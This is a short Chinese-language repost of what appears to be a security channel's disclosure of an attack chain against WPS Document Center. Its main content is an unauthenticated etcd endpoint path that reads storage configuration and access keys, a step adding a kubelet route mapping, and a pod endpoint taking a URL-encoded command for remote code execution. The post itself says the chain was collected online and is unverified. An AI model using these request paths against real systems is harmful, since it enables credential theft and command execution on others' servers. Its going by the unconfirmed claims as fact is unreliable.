> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzkxNzY5MTg1Ng==&mid=2247490037&idx=1&sn=cb9766e7c28a24dbd93e399d36d87709

#  细节已披露：WPS文档中心和文档中台存在远程代码执行 RCE  
棉花糖糖糖  富贵安全   2025-07-18 00:23  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/1mtwZURvGTkCK3ZFyqYEyTwmaLo2YSMeibz3eeShkewiadS4oh0RBl1U7BTVeEscGQrEbjWKcQzGpJEFLwr4cFQw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
![]( "")  
  
  
以下为互联网收集  
攻击链信息，本公众号不为信息真实性担保，  
自行验证真伪，请勿使用本文内容进行违法行为，使用本文内容进行非法渗透测试的一切责任由使用者承担。  
  
  
1.未授权访问  

```
/open/v6/api/etcd/operate?key=/config/storage&method=get
```

  
2.获取AKSK后使用脚本添加kubelet 路由映射（需获取TOKEN）  
  
3.向对应POD发起通信  
后实现RCE  

```
/open/wps/run/{namespace}/{podname}/node-exporter?cmd={url_encode_command} 
```

  
